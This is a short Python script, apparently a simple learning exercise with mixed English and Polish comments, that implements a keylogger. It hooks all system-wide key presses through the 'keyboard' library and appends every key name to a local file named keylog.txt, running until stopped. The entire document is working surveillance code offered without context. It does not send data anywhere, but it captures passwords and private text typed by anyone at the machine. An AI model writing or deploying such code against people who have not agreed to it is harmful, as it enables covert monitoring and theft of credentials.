import keyboard
# import bilbioteki do obsługi plików
import os
# Collect pressed keys
keys = []
def on_key_event(event):
    keys.append(event.name)
    key = str(event.name)
    # Check if file exists, if not create it
    if not os.path.exists("keylog.txt"):
        with open("keylog.txt", "w") as plik:
            plik.write("")
    # Write the key to a file
    with open("keylog.txt", "a") as plik:
        plik.write(key + "\n")
# Hook the keyboard events 

keyboard.on_press(on_key_event)
# Keep the program running
keyboard.wait()
